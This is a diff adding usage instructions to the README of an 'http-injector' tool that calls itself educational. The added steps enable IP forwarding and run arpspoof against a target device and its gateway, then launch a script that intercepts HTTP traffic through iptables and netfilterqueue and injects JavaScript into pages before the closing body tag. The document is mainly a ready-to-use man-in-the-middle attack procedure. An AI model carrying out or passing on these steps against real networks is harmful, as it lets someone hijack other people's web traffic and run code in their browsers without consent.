@@ -34,3 +34,25 @@ A powerful educational tool for understanding HTTP packet manipulation and JavaS
 ```bash
 git clone https://github.com/YOUR_USERNAME/http-injector.git
 cd http-injector
+```
+## 🚀 Usage
+Start ARP spoofing (if targeting another device):
+
+```bash
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t TARGET_IP GATEWAY_IP
+```
+Run the injector:
+```bash
+sudo python3 http_injector.py
+Stop with Ctrl+C (automatically cleans iptables)
+```
+
+## 📖 How It Works
+Packet Interception: Uses netfilterqueue and iptables to capture HTTP packets
+
+Request Modification: Removes Accept-Encoding to prevent compression
+
+Response Injection: Adds JavaScript code before </body> tag
+
+Header Update: Recalculates and updates Content-Length
